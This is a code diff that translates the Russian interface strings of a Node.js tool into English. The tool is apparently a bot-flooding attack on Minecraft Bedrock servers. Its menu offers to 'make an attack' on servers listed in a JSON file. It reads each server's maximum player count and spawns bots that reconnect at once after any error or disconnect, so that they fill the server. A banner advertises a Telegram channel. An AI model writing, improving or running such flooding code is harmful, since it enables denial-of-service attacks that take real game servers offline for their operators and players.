@@ -17,11 +17,11 @@ async function menu() {
      ██║  ██║██║  ██║██║  ██║ ╚═══██╗   ╚═══██╗██╔══╝  ██╔══██╗ ╚████╔╝ ██╔══╝  ██╔══██╗ ╚═══██╗
      ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╔╝███████╗██║  ██║  ╚██╔╝  ███████╗██║  ██║██████╔╝
      ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═════╝
-     тгк: t.me/darkteamLL
+     thc: t.me/darkteamLL
 
-Выберите действие:
-1. Сделать атаку на сервера из списка json файла
-2. выход
+Select an action:
+1. Make an attack on the server from the list of the json file
+2. Exit
 `)
     const choice = await new Promise(resolve => rl.question('Ваш выбор: ', resolve));
     switch (choice) {
@@ -39,7 +39,7 @@ async function menu() {
             rl.close();
             break;
         default:
-            console.log("Выбран неверный пункт меню.");
+            console.log("The wrong menu item is selected.");
             break;
     }
 }
@@ -59,19 +59,19 @@ async function createBot(username, host, port, version, ip_address) {
 
     client.on('join', (packet) => {
         connected = true;
-        console.log(`[${Date.now()}] ${username} успешно подключился к ${ip_address}`);
+        console.log(`[${Date.now()}] ${username} successfully connected to ${ip_address}`);
     });
 
     client.on('error', (err) => {
         console.error(`${username} - Ошибка:`, err);
         if (!connected) {
-            console.error(`Не удалось подключить ${username}, повторная попытка...`);
+            console.error(`Failed to connect ${username}, retry...`);
             setTimeout(() => createBot(username, host, port, version, ip_address), 0);
         }
     });
 
     client.on('disconnect', (packet) => {
-        console.log(`${username} отключился от сервера: ${packet.reason}`);
+        console.log(`${username} disconnected from the server: ${packet.reason}`);
         if (!connected) {
             setTimeout(() => createBot(username, host, port, version, ip_address), 0);
         }
@@ -85,7 +85,7 @@ async function createBotsForServer(server) {
         const result = await mcs.statusBedrock(host, port);
         const maxPlayers = result.players.max;
         const onlinePlayers = result.players.online;
-        const choice = await new Promise(resolve => rl.question('Выберите максимальное количество ботов: ', resolve));
+        const choice = await new Promise(resolve => rl.question('Select the maximum number of bots: ', resolve));
         if (onlinePlayers === -1 || maxPlayers === -1) {
             console.error(`Не удалось получить статус сервера ${host}:${port}`);
             return;
@@ -98,6 +98,6 @@ async function createBotsForServer(server) {
             await new Promise(resolve => setTimeout(resolve, 0)); // Небольшая задержка
         }
     } catch (error) {
-        console.error(`Не удалось подключить ботов к серверу ${host}:${port}: ${error.message}`);
+        console.error(`It was not possible to connect bots to the server ${host}:${port}: ${error.message}`);
     }
 }
